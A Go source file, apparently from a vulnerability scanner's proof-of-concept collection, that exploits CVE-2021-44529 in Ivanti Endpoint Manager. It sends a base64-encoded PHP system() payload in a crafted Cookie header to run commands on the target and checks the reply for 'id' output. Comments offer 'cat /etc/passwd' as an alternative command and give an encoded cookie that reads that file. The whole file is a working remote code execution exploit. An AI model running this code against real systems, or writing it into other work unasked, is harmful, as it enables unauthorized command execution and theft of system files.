package pocs_go

import (
	"encoding/base64"
	util "github.com/hktalent/go-utils"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
)

// https://www.exploit-db.com/exploits/50833
// vanti Endpoint Manager 4.6 - Remote Code Execution (RCE)
/*
Example 1 (count =4) –> payload at 2nd pair: Cookie: hello=ab; exec=<base64 php payload>; cuckoo=; clock=;
Example 2 (count =5) –> payload at 3th pair: Cookie: thisisnice=ab; skipthisone=; executethisone=<base64 php payload>; b=; c=;
Example 3 (count =6) –> payload at 4th pair: Cookie: thisisnice=ab; skipthisone=; alsoskipthisone=; executethisone=<base64 php payload>; b=; c=;
*/
func DoCheck(u string) bool {
	bRst := false
	if oH, err := url.Parse(u); nil == err {
		var aCmd = []string{"id"} // "cat /etc/passwd","ls"
		for _, x := range aCmd {
			x = base64.StdEncoding.EncodeToString([]byte(`system("` + x + `");"`))
			util.PipE.DoGetWithClient4SetHd(nil,
				strings.Join([]string{oH.Scheme, "://", oH.Host, "/../client/index.php"}, ""),
				"GET",
				nil,
				func(resp *http.Response, err error, szU string) {
					if nil == err {
						if data, err := io.ReadAll(resp.Body); nil == err {
							s1 := string(data)
							if a := strings.Split(s1, "<c123>"); 1 < len(a) {
								s1 = strings.Split(a[1], "</c123>")[0]
								if -1 < strings.Index(s1, "uid=") && -1 < strings.Index(s1, "gid=") {
									util.SendLog(szU, "CVE-2021-44529", s1, x)
									bRst = true
								}
							}
						}
					}
				}, func() map[string]string {
					// e=ab; exec=c3lzdGVtKCJjYXQgL2V0Yy9wYXNzd2QiKTs=; pwn=; LDCSASESSID=
					return map[string]string{"Cookie": "ab=ab; c=" + x + "; d=; e=;"}
				}, false)
		}
	} else {
		log.Println(u, err)
	}
	return bRst
}
